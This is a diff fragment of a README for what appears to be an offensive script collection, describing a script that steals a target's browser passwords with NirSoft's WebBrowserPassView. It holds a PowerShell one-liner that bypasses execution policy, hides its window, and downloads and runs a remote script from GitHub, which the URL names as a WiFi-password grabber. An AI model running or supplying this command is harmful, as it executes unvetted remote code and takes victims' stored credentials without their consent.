@@ -30,7 +30,7 @@ A script used to stole target browser Passwords.
 * Downloads a file from the specified URL (NirSoft's WebBrowserPassView utility)
 * Runs the WebBrowserPassView.exe program
 
-All
+Execution
 ```powershell
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Credentials/WWifiPasswords/W-Wifi-Passwords.ps1').Content"
 ```
